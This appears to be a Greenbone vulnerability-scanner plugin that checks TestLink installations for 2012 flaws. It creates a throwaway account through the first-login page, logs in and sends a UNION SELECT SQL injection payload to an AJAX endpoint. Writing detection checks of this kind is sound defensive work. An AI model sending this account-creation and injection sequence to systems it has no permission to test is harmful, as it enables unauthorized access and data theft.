# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:testlink:testlink";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103536");
  script_version("2021-12-14T13:34:30+0000");
  script_tag(name:"last_modification", value:"2021-12-14 13:34:30 +0000 (Tue, 14 Dec 2021)");
  script_tag(name:"creation_date", value:"2012-08-15 10:10:37 +0200 (Wed, 15 Aug 2012)");
  script_tag(name:"cvss_base", value:"7.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("TestLink Multiple Vulnerabilities (Aug 2012)");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_testlink_http_detect.nasl");
  script_mandatory_keys("testlink/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"TestLink is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP requests and checks the responses.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - Arbitrary file upload

  - Information disclosure

  - Cross-site request forgery (CSRF)");

  script_tag(name:"impact", value:"Exploiting these vulnerabilities may allow an attacker to
  harvest sensitive information, upload and execute arbitrary server side code in the context of
  the web server, or perform unauthorized actions on behalf of a user in the context of the site.
  This may aid in launching further attacks.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54990");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

vtstrings = get_vt_strings();

login = rand();
pass  = rand();
fname = vtstrings["lowercase_rand"];
lname = vtstrings["lowercase_rand"];

create_account_post = 'login=' + login  + '&password=' + pass + '&password2=' + pass + '&firstName=' +
                      fname + '&lastName=' + lname + '&email=' + lname +
                      '@example.org&doEditUser=Add+User+Data';

url = dir + "/firstLogin.php";
headers = make_array("Content-Type", "application/x-www-form-urlencoded");

req = http_post_put_req(port:port, url:url, data:create_account_post, add_headers:headers);
res = http_keepalive_send_recv(port:port, data:req);

if (res !~ "^HTTP/1\.[01] 200" || "location.href=" >!< res)
  exit(0);

login_post = 'reqURI=&destination=&tl_login=' + login  + '&tl_password=' + pass  + '&login_submit=Login';

url = dir + "/login.php";

req = http_post_put_req(port:port, url:url, data:login_post, add_headers:headers);
res = http_keepalive_send_recv(port:port, data:req);

if (res !~ "^HTTP/1\.[01] 200" || "location.href=" >!< res)
  exit(0);

session_id = eregmatch(pattern:"Set-Cookie: ([^;]*);",string:res);
if (isnull(session_id[1]))
  exit(0);

id = rand();

url = dir + "/lib/ajax/gettprojectnodes.php?root_node=-1+union+select+0x53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6--";

headers = make_array("Cookie", session_id[1]);

req = http_get_req(port:port, url:url, add_headers:headers);
res = http_keepalive_send_recv(port:port, data:req);

if ("SQL-Injection-Test" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
